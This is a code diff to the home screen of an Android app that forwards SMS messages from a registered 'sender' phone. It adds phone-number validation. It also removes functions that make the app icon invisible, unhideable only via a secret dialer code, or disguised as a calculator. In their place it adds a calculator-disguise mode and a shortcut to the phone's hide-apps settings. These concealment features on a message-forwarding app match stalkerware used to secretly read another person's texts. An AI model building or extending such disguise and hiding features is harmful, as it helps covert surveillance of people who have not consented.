@@ -2,6 +2,7 @@ package com.smsforwarder.app.ui.home
 
 import android.content.Context
 import android.content.Intent
+import android.os.Build
 import android.provider.Settings
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.*
@@ -28,6 +29,10 @@ import androidx.compose.ui.unit.sp
 import com.smsforwarder.app.domain.model.DeviceInfo
 import com.smsforwarder.app.domain.model.DeviceRole
 import com.smsforwarder.app.ui.theme.AccentGreen
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.launch
 import com.smsforwarder.app.ui.theme.PrimaryBlue
 import com.smsforwarder.app.ui.theme.WarningAmber
 
@@ -35,6 +40,7 @@ import com.smsforwarder.app.ui.theme.WarningAmber
 @Composable
 fun HomeScreen(
     viewModel: HomeViewModel,
+    onNavigateCalculator: () -> Unit,
     onNavigatePairing: () -> Unit,
     onNavigateHistory: () -> Unit,
     onNavigateFilters: () -> Unit,
@@ -57,13 +63,18 @@ fun HomeScreen(
                 }
             )
         } else {
-            SenderRegisteredScreen(info = deviceInfo)
+            SenderRegisteredScreen(
+                info = deviceInfo,
+                viewModel = viewModel,
+                onNavigateCalculator = onNavigateCalculator
+            )
         }
     } else {
         // Full dashboard for Receiver / Dual client phone
         FullDashboardScreen(
             state = state,
             viewModel = viewModel,
+            onNavigateCalculator = onNavigateCalculator,
             onNavigatePairing = onNavigatePairing,
             onNavigateHistory = onNavigateHistory,
             onNavigateFilters = onNavigateFilters,
@@ -129,6 +140,8 @@ private fun SenderFormScreen(
 
                 Spacer(modifier = Modifier.height(8.dp))
 
+                val isMobileValid = mobileNumber.length == 10 && mobileNumber.all { it.isDigit() }
+
                 OutlinedTextField(
                     value = name,
                     onValueChange = { name = it },
@@ -141,11 +154,35 @@ private fun SenderFormScreen(
 
                 OutlinedTextField(
                     value = mobileNumber,
-                    onValueChange = { mobileNumber = it },
-                    label = { Text("Mobile Number") },
+                    onValueChange = { newValue ->
+                        val filtered = newValue.filter { it.isDigit() }
+                        if (filtered.length <= 10) {
+                            mobileNumber = filtered
+                        }
+                    },
+                    label = { Text("Mobile Number (10 Digits)") },
                     leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
-                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
+                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                     singleLine = true,
+                    isError = mobileNumber.isNotEmpty() && !isMobileValid,
+                    supportingText = {
+                        if (mobileNumber.isNotEmpty() && !isMobileValid) {
+                            Text(
+                                text = "Mobile number must be exactly 10 digits (${mobileNumber.length}/10)",
+                                color = MaterialTheme.colorScheme.error
+                            )
+                        } else if (isMobileValid) {
+                            Text(
+                                text = "✓ Valid 10-digit mobile number",
+                                color = AccentGreen
+                            )
+                        } else {
+                            Text(
+                                text = "Enter 10-digit mobile number",
+                                color = MaterialTheme.colorScheme.onSurfaceVariant
+                            )
+                        }
+                    },
                     modifier = Modifier.fillMaxWidth(),
                     shape = RoundedCornerShape(12.dp)
                 )
@@ -173,7 +210,7 @@ private fun SenderFormScreen(
 
                 Button(
                     onClick = { onRegister(name, mobileNumber, address) },
-                    enabled = !isRegistering && name.isNotBlank() && mobileNumber.isNotBlank(),
+                    enabled = !isRegistering && name.isNotBlank() && isMobileValid,
                     modifier = Modifier
                         .fillMaxWidth()
                         .height(50.dp),
@@ -199,7 +236,11 @@ private fun SenderFormScreen(
  * Clean Screen shown after Sender Phone is registered: "It is registered" (No other options).
  */
 @Composable
-private fun SenderRegisteredScreen(info: DeviceInfo) {
+private fun SenderRegisteredScreen(
+    info: DeviceInfo,
+    viewModel: HomeViewModel,
+    onNavigateCalculator: () -> Unit
+) {
     val context = LocalContext.current
     var isNotificationListenerEnabled by remember {
         mutableStateOf(checkNotificationListenerEnabled(context))
@@ -282,31 +323,34 @@ private fun SenderRegisteredScreen(info: DeviceInfo) {
                 }
             }
 
-            // STEALTH & DISGUISE BUTTONS (Appears only after Registration)
+            // CALCULATOR DISGUISE BUTTON (Appears only after Registration)
             Column(verticalArrangement = Arrangement.spacedBy(10.dp), modifier = Modifier.fillMaxWidth()) {
                 Button(
-                    onClick = { hideAppStealth(context) },
+                    onClick = {
+                        viewModel.setCalculatorDisguised(true)
+                        onNavigateCalculator()
+                    },
                     modifier = Modifier
                         .fillMaxWidth()
                         .height(50.dp),
                     shape = RoundedCornerShape(12.dp),
                     colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
                 ) {
-                    Icon(Icons.Default.VisibilityOff, contentDescription = null)
+                    Icon(Icons.Default.Calculate, contentDescription = null)
                     Spacer(modifier = Modifier.width(8.dp))
-                    Text("Hide Icon Completely (Vanish Mode)", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                    Text("🔒 Switch to Calculator App Mode", fontSize = 15.sp, fontWeight = FontWeight.Bold)
                 }
 
                 OutlinedButton(
-                    onClick = { disguiseAsCalculator(context) },
+                    onClick = { openSystemHideAppsSettings(context) },
                     modifier = Modifier
                         .fillMaxWidth()
                         .height(50.dp),
                     shape = RoundedCornerShape(12.dp)
                 ) {
-                    Icon(Icons.Default.Calculate, contentDescription = null, tint = AccentGreen)
+                    Icon(Icons.Default.Security, contentDescription = null, tint = AccentGreen)
                     Spacer(modifier = Modifier.width(8.dp))
-                    Text("Disguise App as Calculator Icon", fontSize = 15.sp, fontWeight = FontWeight.Bold)
+                    Text("📲 Open Phone's Native Hide Apps Setting", fontSize = 14.sp, fontWeight = FontWeight.SemiBold)
                 }
             }
 
@@ -400,6 +444,7 @@ private fun InfoRow(label: String, value: String) {
 private fun FullDashboardScreen(
     state: HomeUiState,
     viewModel: HomeViewModel,
+    onNavigateCalculator: () -> Unit,
     onNavigatePairing: () -> Unit,
     onNavigateHistory: () -> Unit,
     onNavigateFilters: () -> Unit,
@@ -451,28 +496,31 @@ private fun FullDashboardScreen(
                 if (info.isRegistered) {
                     Column(verticalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
                         Button(
-                            onClick = { hideAppStealth(context) },
+                            onClick = {
+                                viewModel.setCalculatorDisguised(true)
+                                onNavigateCalculator()
+                            },
                             modifier = Modifier
                                 .fillMaxWidth()
                                 .height(48.dp),
                             shape = RoundedCornerShape(12.dp),
                             colors = ButtonDefaults.buttonColors(containerColor = PrimaryBlue)
                         ) {
-                            Icon(Icons.Default.VisibilityOff, contentDescription = null)
+                            Icon(Icons.Default.Calculate, contentDescription = null)
                             Spacer(modifier = Modifier.width(8.dp))
-                            Text("Hide Icon Completely (Vanish Mode)", fontWeight = FontWeight.Bold)
+                            Text("🔒 Switch to Calculator App Mode", fontWeight = FontWeight.Bold)
                         }
 
                         OutlinedButton(
-                            onClick = { disguiseAsCalculator(context) },
+                            onClick = { openSystemHideAppsSettings(context) },
                             modifier = Modifier
                                 .fillMaxWidth()
                                 .height(48.dp),
                             shape = RoundedCornerShape(12.dp)
                         ) {
-                            Icon(Icons.Default.Calculate, contentDescription = null, tint = AccentGreen)
+                            Icon(Icons.Default.Security, contentDescription = null, tint = AccentGreen)
                             Spacer(modifier = Modifier.width(8.dp))
-                            Text("Disguise App as Calculator Icon", fontWeight = FontWeight.Bold)
+                            Text("📲 Open Phone's Native Hide Apps Setting", fontWeight = FontWeight.SemiBold)
                         }
                     }
                 }
@@ -756,63 +804,25 @@ private fun RoleBadge(role: DeviceRole, onClick: () -> Unit) {
     }
 }
 
-private fun hideAppStealth(context: Context) {
-    val appContext = context.applicationContext
-    val pm = appContext.packageManager
+private fun openSystemHideAppsSettings(context: Context) {
+    android.widget.Toast.makeText(
+        context,
+        "Opening Phone Settings... Go to Privacy / Security -> Hide Apps",
+        android.widget.Toast.LENGTH_LONG
+    ).show()
 
-    runCatching {
-        // Disable default LauncherAlias & CalculatorAlias
-        val defaultAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.LauncherAlias")
-        val calcAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.CalculatorAlias")
+    val intents = listOf(
+        Intent(Settings.ACTION_PRIVACY_SETTINGS),
+        Intent(Settings.ACTION_SECURITY_SETTINGS),
+        Intent(Settings.ACTION_SETTINGS)
+    )
 
-        pm.setComponentEnabledSetting(
-            defaultAlias,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
-        )
-        pm.setComponentEnabledSetting(
-            calcAlias,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
-        )
-
-        // Enable InvisibleAlias (Transparent Icon + Blank Name)
-        val invisibleAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.InvisibleAlias")
-        pm.setComponentEnabledSetting(
-            invisibleAlias,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
-        )
+    for (intent in intents) {
+        try {
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            context.startActivity(intent)
+            break
+        } catch (_: Exception) {
+        }
     }
-
-    android.widget.Toast.makeText(appContext, "App icon is now 100% INVISIBLE & HIDDEN in Apps list! Dial *#*#767#*#* to unhide.", android.widget.Toast.LENGTH_LONG).show()
-    val activity = context as? android.app.Activity
-    activity?.moveTaskToBack(true)
-}
-
-private fun disguiseAsCalculator(context: Context) {
-    val appContext = context.applicationContext
-    val pm = appContext.packageManager
-
-    runCatching {
-        // Disable LauncherAlias
-        val defaultAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.LauncherAlias")
-        pm.setComponentEnabledSetting(
-            defaultAlias,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
-        )
-
-        // Enable CalculatorAlias
-        val calcAlias = android.content.ComponentName(appContext.packageName, "${appContext.packageName}.CalculatorAlias")
-        pm.setComponentEnabledSetting(
-            calcAlias,
-            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-            android.content.pm.PackageManager.DONT_KILL_APP
-        )
-    }
-
-    android.widget.Toast.makeText(appContext, "App icon disguised as Calculator in Apps list!", android.widget.Toast.LENGTH_LONG).show()
-    val activity = context as? android.app.Activity
-    activity?.moveTaskToBack(true)
 }
